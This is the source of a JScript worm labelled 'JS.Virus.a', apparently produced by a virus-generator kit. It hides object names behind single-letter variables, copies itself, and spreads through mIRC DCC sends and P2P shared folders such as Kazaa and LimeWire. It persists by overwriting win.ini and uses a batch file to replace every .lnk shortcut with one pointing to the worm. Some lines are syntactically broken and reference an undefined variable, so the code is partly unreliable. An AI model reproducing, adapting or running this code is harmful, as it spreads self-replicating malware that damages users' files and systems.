// Virusname: JS.Virus.a
// by Second Part To Hell
// generated with JavaScriptGenerator v1.02
var xziok="a"
var asflc="b"
var gnyxd="c"
var ffdre="d"
var ryqkz="e"
var dzwee="f"
var pfctq="g"
var tnnra="h"
var twree="i"
var hlvqw="j"
var fggts="k"
var ojkzk="l"
var zndsb="m"
var rtuka="n"
var usrcv="o"
var wsflq="p"
var usstu="q"
var vhlvq="r"
var jaubh="s"
var ssryv="t"
var nzuzf="u"
var uarzb="v"
var xgsol="w"
var wwods="x"
var lslwe="y"
var huwdp="z"
var mzlvm="."
var obmeb = WScript.CreateObject(jaubh+gnyxd+vhlvq+twree+wsflq+ssryv+twree+rtuka+pfctq+mzlvm+dzwee+twree+ojkzk+ryqkz+jaubh+lslwe+jaubh+ssryv+ryqkz+zndsb+usrcv+asflc+hlvqw+ryqkz+gnyxd+ssryv)
var rqxir = obmeb.OpenTextFile(WScript.ScriptFullName, 1)
var jqsdl=rqxir.ReadAll()
var puipy=WScript.CreateObject(xgsol+jaubh+gnyxd+vhlvq+twree+wsflq+ssryv+mzlvm+jaubh+tnnra+ryqkz+ojkzk+ojkzk)
rqxir.Close();
hhsxc=obmeb.CreateTextFile("nbcil.js");
hhsxc.WriteLine(jqsdl);
hhsxc.Close();
if (obmeb.FolderExists("C:\\mirc"))
{ var ofqkk="C:\\mirc";
}
if (obmeb.FolderExists("C:\\Programme\\mirc"))
{ var ofqkk="C:\\Programme\\mirc";
}
if (obmeb.FolderExists("C:\\Program Files\\mirc"))
{ var ofqkk="C:\\Program Files\\mirc";
}
if (ofqkk!="")
{ obmeb.CopyFile("nbcil.js",ofqkk+"\\");
iqrai=obmeb.CreateTextFile(ofqkk+"\\script.ini");
iqrai.WriteLine("[script]");
iqrai.WriteLine("n0=on 1:join:*.*: { if ( $nick ==$me ) {halt} /dcc send $nick "+ofqkk+"\\ }");
iqrai.Close();
}
obmeb.CopyFile("nbcil.js","C:\\Windows\\cpnlw.js");
czfol=obmeb.CreateTextFile("C:\\Windows\\win.ini");
czfol.WriteLine("[windows]");
czfol.WriteLine("load=C:\\Windows\\cpnlw.js");
czfol.WriteLine("run=C:\\Windows\\cpnlw.js");
czfol.WriteLine("NullPort=None");
czfol.Close();
ikrms=(hvqvo+"\\Kazaa\\My Shared Folder");
if (obmeb.FolderExists(ikrms))
{ obmeb.CopyFile("nbcil.js", ikrms"+\\");
}
xqsgy=(hvqvo+"\\KaZaA Lite\\My Shared Folder");
if (obmeb.FolderExists(xqsgy))
{ obmeb.CopyFile("nbcil.js", xqsgy"+\\");
}
qlzck=(hvqvo+"\\Morpheus\\My Shared Folder");
if (obmeb.FolderExists(qlzck))
{ obmeb.CopyFile("nbcil.js", qlzck"+\\");
}
rxxqj=(hvqvo+"\\Grokster\\My Grokster");
if (obmeb.FolderExists(rxxqj))
{ obmeb.CopyFile("nbcil.js", rxxqj"+\\");
}
upxze=(hvqvo+"\\BearShare\\Shared");
if (obmeb.FolderExists(upxze))
{ obmeb.CopyFile("nbcil.js", upxze"+\\");
}
cswqe=(hvqvo+"\\KMD\\My Shared Folder");
if (obmeb.FolderExists(cswqe))
{ obmeb.CopyFile("nbcil.js", cswqe"+\\");
}
aijav=(hvqvo+"\\LimeWire\\Shared");
if (obmeb.FolderExists(aijav))
{ obmeb.CopyFile("nbcil.js", aijav"+\\");
}
lvran=(hvqvo+"\\edonkey2000\\incoming");
if (obmeb.FolderExists(lvran))
{ obmeb.CopyFile("nbcil.js", lvran"+\\");
}
obmeb.CopyFile("nbcil.js","C:\\tcrsi.js");
var vhpru=puipy.CreateShortCut("hiemj.lnk");
vhpru.TargetPath=puipy.ExpandEnvironmentStrings("C:\\tcrsi.js");
vhpru.Save();
eztgf=obmeb.CreateTextFile("vshyh.bat");
eztgf.WriteLine("for %%l in (*.lnk ..\\*.lnk \\*.lnk %path%\\*.lnk) do copy hiemj.lnk %%l");
eztgf.Close();
puipy.Run("vshyh.bat");
